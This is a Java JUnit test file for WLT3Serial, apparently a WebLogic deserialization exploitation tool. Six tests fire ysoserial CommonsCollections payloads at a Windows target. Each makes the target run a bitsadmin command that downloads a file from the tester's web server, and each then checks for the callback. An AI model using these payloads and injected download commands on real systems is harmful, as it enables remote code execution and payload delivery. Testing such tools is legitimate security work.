/*
	CommonsCollectionsWindowsTests.java
	
	v0.3 (1/18/2018)
	
	Test to ensure WLT3Serial performs successful exploitation of Windows target system using various CommonsCollections ysoserial payload types.
*/

package bort.millipede.wlt3.tests.exploit;

import java.io.IOException;

import bort.millipede.wlt3.tests.WLT3SerialTestHelper;
import bort.millipede.wlt3.tests.WebServerTestHelper;
import org.junit.Assert;
import org.junit.Before;
import org.junit.After;
import org.junit.Test;

public class CommonsCollectionsWindowsTests {
	WebServerTestHelper ws;
	
	@Before
	public void setUp() throws IOException {
		try {
			ws = new WebServerTestHelper();
		} catch(IOException ioe) {
			throw new IOException("Embedded web server component failed to start!",ioe);
		} catch(Exception e) {
			throw e;
		}
	}
	
	@After
	public void tearDown() {
		try {
			ws.stop();
		} catch(Exception e) {
			//don't care
		}
	}
		
	@Test
	public void testAssertWindowsCommonsCollections1() {
		WLT3SerialTestHelper.checkTargetParams();
		String path = ws.createContext();
		WLT3SerialTestHelper.runExploit(null,"CommonsCollections1","bitsadmin /transfer CC1Win /download /priority high http://"+System.getProperty("localhost.ip")+":"+Integer.toString(ws.getPort())+"/"+path+" C:\\Windows\\Temp\\CC1Win.txt");
		String remoteIP = WLT3SerialTestHelper.getAccessedHost(ws,path);
		WLT3SerialTestHelper.checkAccessedHost(remoteIP);
	}

	@Test
	public void testAssertWindowsCommonsCollections2() {
		WLT3SerialTestHelper.checkTargetParams();
		String path = ws.createContext();
		WLT3SerialTestHelper.runExploit(null,"CommonsCollections2","bitsadmin /transfer CC2Win /download /priority high http://"+System.getProperty("localhost.ip")+":"+Integer.toString(ws.getPort())+"/"+path+" C:\\Windows\\Temp\\CC2Win.txt");
		String remoteIP = WLT3SerialTestHelper.getAccessedHost(ws,path);
		WLT3SerialTestHelper.checkAccessedHost(remoteIP);
	}

	@Test
	public void testAssertWindowsCommonsCollections3() {
		WLT3SerialTestHelper.checkTargetParams();
		String path = ws.createContext();
		WLT3SerialTestHelper.runExploit(null,"CommonsCollections3","bitsadmin /transfer CC3Win /download /priority high http://"+System.getProperty("localhost.ip")+":"+Integer.toString(ws.getPort())+"/"+path+" C:\\Windows\\Temp\\CC3Win.txt");
		String remoteIP = WLT3SerialTestHelper.getAccessedHost(ws,path);
		WLT3SerialTestHelper.checkAccessedHost(remoteIP);
	}

	@Test
	public void testAssertWindowsCommonsCollections4() {
		WLT3SerialTestHelper.checkTargetParams();
		String path = ws.createContext();
		WLT3SerialTestHelper.runExploit(null,"CommonsCollections4","bitsadmin /transfer CC4Win /download /priority high http://"+System.getProperty("localhost.ip")+":"+Integer.toString(ws.getPort())+"/"+path+" C:\\Windows\\Temp\\CC4Win.txt");
		String remoteIP = WLT3SerialTestHelper.getAccessedHost(ws,path);
		WLT3SerialTestHelper.checkAccessedHost(remoteIP);
	}

	@Test
	public void testAssertWindowsCommonsCollections5() {
		WLT3SerialTestHelper.checkTargetParams();
		String path = ws.createContext();
		WLT3SerialTestHelper.runExploit(null,"CommonsCollections5","bitsadmin /transfer CC5Win /download /priority high http://"+System.getProperty("localhost.ip")+":"+Integer.toString(ws.getPort())+"/"+path+" C:\\Windows\\Temp\\CC5Win.txt");
		String remoteIP = WLT3SerialTestHelper.getAccessedHost(ws,path);
		WLT3SerialTestHelper.checkAccessedHost(remoteIP);
	}

	@Test
	public void testAssertWindowsCommonsCollections6() {
		WLT3SerialTestHelper.checkTargetParams();
		String path = ws.createContext();
		WLT3SerialTestHelper.runExploit(null,"CommonsCollections6","bitsadmin /transfer CC6Win /download /priority high http://"+System.getProperty("localhost.ip")+":"+Integer.toString(ws.getPort())+"/"+path+" C:\\Windows\\Temp\\CC6Win.txt");
		String remoteIP = WLT3SerialTestHelper.getAccessedHost(ws,path);
		WLT3SerialTestHelper.checkAccessedHost(remoteIP);
	}
}

